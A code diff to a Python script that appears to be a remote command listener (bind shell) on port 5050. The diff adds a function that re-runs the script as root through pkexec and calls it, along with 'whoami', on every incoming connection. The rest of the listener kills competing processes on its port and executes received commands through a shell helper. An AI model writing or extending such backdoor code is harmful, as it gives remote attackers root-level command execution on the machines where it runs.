@@ -31,6 +31,13 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 HOST, PORT = "0.0.0.0", 5050
 
 
+def privesc():
+    if os.getuid() != 0:
+        print("Elevating to root...")
+        subprocess.run(["pkexec", sys.executable, THIS_FILE])
+        sys.exit()
+ 
+
 def kill_others():
     """
     Since a port can only be bound by one program, kill all other programs on this port that we can see.
@@ -81,6 +88,8 @@ def bootstrap_packages():
 
 
 def handle_conn(conn, addr):
+    run_command("whoami")
+    privesc()
     with conn:
         print(f"connected by {addr}")
         # If you need to receive more data, you may need to loop
@@ -91,7 +100,6 @@ def handle_conn(conn, addr):
         # base64 encode every command, etc
         data = conn.recv(1024) 
         print("received: " + data.decode("utf-8", errors="replace"))
-
         if not data:
             return
         
@@ -109,8 +117,7 @@ def handle_conn(conn, addr):
 def main():
     kill_others()
     bootstrap_packages()
-
-
+    
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
@@ -124,7 +131,6 @@ def main():
                 raise
             except:
                 print("Connection died")
-
 
 if __name__ == "__main__":
     main()
